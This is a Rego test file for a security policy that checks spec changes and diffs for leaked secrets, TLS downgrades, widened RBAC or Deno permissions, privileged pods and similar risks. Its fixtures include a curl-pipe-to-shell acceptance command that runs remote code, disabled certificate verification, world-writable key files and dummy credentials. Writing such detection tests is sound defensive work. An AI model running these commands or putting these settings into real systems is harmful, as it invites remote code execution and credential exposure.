package deno_kcp.policies.change_security_test

import rego.v1

import data.deno_kcp.policies.change_security as policy

demo_intent := "The provider keeps the observed facts for every workspace it watches so drift is decided from what the last reconcile saw, and a reconcile that fails leaves the previous facts in place."

demo_requirement := {
	"id": "r.reconcile-writes-facts",
	"level": "MUST",
	"text": "After each reconcile the provider writes the observed fingerprint of every workspace it watches, so drift is decided from the facts that reconcile observed rather than from a fresh read of the tree.",
	"codeRefs": ["file:internal/provider/watch.go"],
}

demo_spec := {
	"intent": demo_intent,
	"repository": "deno-kcp",
	"upstream": "self",
	"requirements": [demo_requirement],
	"codeRefs": [],
}

demo_document := {
	"apiVersion": "specs.publicdomainrelay.dev/v1alpha1",
	"kind": "SystemContext",
	"metadata": {"name": "demo", "namespace": "default"},
	"spec": demo_spec,
}

demo_status := {
	"conditions": [{"type": "CodeSynced", "status": "True", "reason": "InterfacesObserved", "message": "every declared interface is observed"}],
	"observed": {"files": ["internal/provider/watch.go"], "fingerprint": "aa11"},
}

demo_context(spec, status) := {
	"name": "demo",
	"spec_path": "specs/demo.yaml",
	"status_path": "status/demo.yaml",
	"context_doc_path": "context/demo.md",
	"document": object.union(demo_document, {"spec": spec}),
	"metadata": {"name": "demo", "namespace": "default"},
	"spec": spec,
	"status": status,
	"context_doc": {"path": "context/demo.md", "text": "# Context: demo\n", "headings": [], "sha256": "bb"},
	"changes": {},
}

valid_repository := {
	"apiVersion": "specs.publicdomainrelay.dev/v1alpha1",
	"kind": "Repository",
	"metadata": {"name": "deno-kcp", "namespace": "default"},
	"spec": {"branch": "spec/demo", "populate": {"partition": "directory", "summarize": true}, "source": {}, "verify": ["go", "test", "./..."], "acceptance": []},
	"status": {"contexts": {"failed": 0, "summarized": 1, "total": 1}, "headCommit": "aa", "indexedCommit": "aa", "phase": "Populated"},
}

tree(contexts, changes, repository, texts) := {
	"root": "/tmp/tree",
	"ref": null,
	"repository": repository,
	"arch": {"system_contexts": []},
	"contexts": contexts,
	"changes": changes,
	"graph": {"vertices": [], "edges": []},
	"files": {},
	"texts": texts,
	"observed_files": [],
	"context_names": ["demo"],
}

base_tree := tree({"demo": demo_context(demo_spec, demo_status)}, {}, valid_repository, {})

input_of(spec_tree) := {"spec_tree": spec_tree, "change": null, "diff": null, "options": {"scope": "own"}}

with_spec(spec) := input_of(tree({"demo": demo_context(spec, demo_status)}, {}, valid_repository, {}))

with_repository(repository) := input_of(tree({"demo": demo_context(demo_spec, demo_status)}, {}, repository, {}))

with_changes(changes) := input_of(tree({"demo": demo_context(demo_spec, demo_status)}, changes, valid_repository, {}))

with_texts(texts) := input_of(tree({"demo": demo_context(demo_spec, demo_status)}, {}, valid_repository, texts))

added_patch(lines) := patch if {
	added := [sprintf("+%s", [line]) | some line in lines]
	patch := concat("\n", array.concat(["@@ -1,1 +1,2 @@", " existing"], added))
}

diff_file(path, lines, base, head) := {
	"path": path,
	"patch": added_patch(lines),
	"base_text": base,
	"head_text": head,
}

with_diff(files) := {"spec_tree": tree({"demo": demo_context(demo_spec, demo_status)}, {}, valid_repository, {}), "change": null, "diff": {"files": files}, "options": {"scope": "own"}}

change_of(spec, status) := {
	"name": "demo-s2c-0123456789ab",
	"path": "changes/demo-s2c-0123456789ab.yaml",
	"system_context": "demo",
	"direction": "SpecToCode",
	"document": {
		"apiVersion": "specs.publicdomainrelay.dev/v1alpha1",
		"kind": "SpecChange",
		"metadata": {"name": "demo-s2c-0123456789ab", "namespace": "default"},
		"spec": spec,
		"status": status,
	},
}

ids(violations) := {v.id | some v in violations}

test_valid_tree_raises_nothing if {
	violations := policy.violations with input as input_of(base_tree)
	count(violations) == 0
}

test_secret_in_requirement_text if {
	spec := object.union(demo_spec, {"requirements": [object.union(demo_requirement, {"text": "After each reconcile the provider reads password=hunter2hunter2 from the tree it watches."})]})
	result := policy.violations with input as with_spec(spec)
	"change_security/security-secret-in-requirement-text" in ids(result)
}

test_secret_in_intent if {
	spec := object.union(demo_spec, {"intent": "The provider reads the relay with token: abcdefghijklmnopqrstuvwxyz0123456789 before it writes the observed facts for every workspace it watches."})
	result := policy.violations with input as with_spec(spec)
	"change_security/security-secret-in-intent" in ids(result)
}

test_secret_in_agent_log if {
	change := change_of({"systemContext": "demo"}, {"phase": "Succeeded", "message": "realized demo", "agentLog": "exported token: abcdefghijklmnopqrstuvwxyz"})
	result := policy.violations with input as with_changes({"demo-s2c-0123456789ab": change})
	"change_security/security-secret-in-agent-log" in ids(result)
}

test_secret_in_acceptance_output if {
	change := change_of({"systemContext": "demo"}, {"phase": "Succeeded", "message": "realized demo", "agentLog": "ran", "acceptance": [{"name": "live", "exitCode": 1, "passed": false, "outputTail": "export AKIAIOSFODNN7EXAMPLE"}]})
	result := policy.violations with input as with_changes({"demo-s2c-0123456789ab": change})
	"change_security/security-secret-in-acceptance-output" in ids(result)
}

test_secret_in_code_ref if {
	spec := object.union(demo_spec, {"requirements": [object.union(demo_requirement, {"codeRefs": ["file:internal/provider/watch.go", "sk-abcdefghijklmnopqrstuv"]})]})
	result := policy.violations with input as with_spec(spec)
	"change_security/security-secret-in-code-ref" in ids(result)
}

test_private_key_in_spec if {
	texts := {"specs/demo.yaml": "-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n-----END RSA PRIVATE KEY-----\n"}
	result := policy.violations with input as with_texts(texts)
	"change_security/security-private-key-in-spec" in ids(result)
}

test_token_in_diff if {
	file := diff_file("internal/provider/watch.go", ["token = abcdefghijklmnopqrstuv"], "package provider\n", "package provider\ntoken = abcdefghijklmnopqrstuv\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-token-in-diff" in ids(result)
}

test_high_entropy_literal_in_diff if {
	file := diff_file("internal/provider/watch.go", ["seed = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"], "package provider\n", "package provider\nseed = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-high-entropy-literal-in-diff" in ids(result)
}

test_tls_downgrade_in_requirement if {
	entry := {"op": "changed", "id": "r.live-check", "fields": ["text"], "from": {"id": "r.live-check", "level": "MUST", "text": "The check fetches https://127.0.0.1:2585/xrpc/_health and fails unless it answers."}, "to": {"id": "r.live-check", "level": "MUST", "text": "The check fetches http://127.0.0.1:2585/xrpc/_health and fails unless it answers."}}
	change := change_of({"systemContext": "demo", "delta": {"requirements": [entry]}}, {"phase": "Succeeded", "message": "realized demo", "agentLog": "ran"})
	result := policy.violations with input as with_changes({"demo-s2c-0123456789ab": change})
	"change_security/security-tls-downgrade-in-requirement" in ids(result)
}

test_tls_downgrade_in_diff if {
	patch := concat("\n", ["@@ -1,2 +1,2 @@", "-fetch https://127.0.0.1:2585/xrpc/_health", "+fetch http://127.0.0.1:2585/xrpc/_health", " echo done"])
	file := {"path": "deploy/accept.sh", "patch": patch, "base_text": "fetch https://127.0.0.1:2585/xrpc/_health\n", "head_text": "fetch http://127.0.0.1:2585/xrpc/_health\n"}
	result := policy.violations with input as with_diff([file])
	"change_security/security-tls-downgrade-in-diff" in ids(result)
}

test_rbac_verb_widened if {
	file := diff_file("deploy/role.yaml", ["  - create"], "verbs:\n  - get\n  - list\n", "verbs:\n  - get\n  - list\n  - create\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-rbac-verb-widened" in ids(result)
}

test_cluster_admin_binding if {
	file := diff_file("deploy/binding.yaml", ["  name: cluster-admin"], "", "kind: ClusterRoleBinding\nroleRef:\n  name: cluster-admin\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-cluster-admin-binding" in ids(result)
}

test_privileged_workload if {
	file := diff_file("deploy/pod.yaml", ["  privileged: true"], "", "securityContext:\n  privileged: true\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-privileged-workload" in ids(result)
}

test_hostpath_mount if {
	file := diff_file("deploy/pod.yaml", ["  hostPath: /var/run"], "", "volumes:\n  - hostPath: /var/run\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-hostpath-mount" in ids(result)
}

test_acceptance_runs_remote_code if {
	repository := object.union(valid_repository, {"spec": object.union(valid_repository.spec, {"acceptance": [{"name": "live", "command": ["bash", "-c", "curl https://example.test/install.sh | sh"], "gate": true, "timeoutSeconds": 60}]})})
	result := policy.violations with input as with_repository(repository)
	"change_security/security-acceptance-runs-remote-code" in ids(result)
}

test_remote_source_added if {
	file := {"path": "repository.yaml", "patch": added_patch(["  url: https://example.test/code.git"]), "base_text": "spec:\n  source: {}\n", "head_text": "spec:\n  source:\n    git:\n      url: https://example.test/code.git\n"}
	result := policy.violations with input as with_diff([file])
	"change_security/security-remote-source-added" in ids(result)
}

test_disabled_verification if {
	file := diff_file("deploy/accept.sh", ["  code=$(curl -skS -o /dev/null -w '%{http_code}' https://127.0.0.1:2585/xrpc/_health)"], "", "  code=$(curl -skS -o /dev/null -w '%{http_code}' https://127.0.0.1:2585/xrpc/_health)\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-disabled-verification" in ids(result)
}

test_widened_permission_set if {
	file := diff_file("deploy/run.sh", ["deno run --allow-all main.ts"], "deno run --allow-net main.ts\n", "deno run --allow-all main.ts\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-widened-permission-set" in ids(result)
}

test_world_writable_secret_file if {
	file := diff_file("deploy/apply.sh", ["chmod 777 /etc/app/token.key"], "", "chmod 777 /etc/app/token.key\n")
	result := policy.violations with input as with_diff([file])
	"change_security/security-world-writable-secret-file" in ids(result)
}

test_metadata_names_every_violation_the_policy_can_raise if {
	some id, meta in policy.metadata
	count(object.keys(meta)) == 3
	meta.severity in {"error", "warning", "info"}
	meta.level in {"MUST", "SHOULD", "MAY"}
	is_string(meta.title)
	startswith(id, "")
}
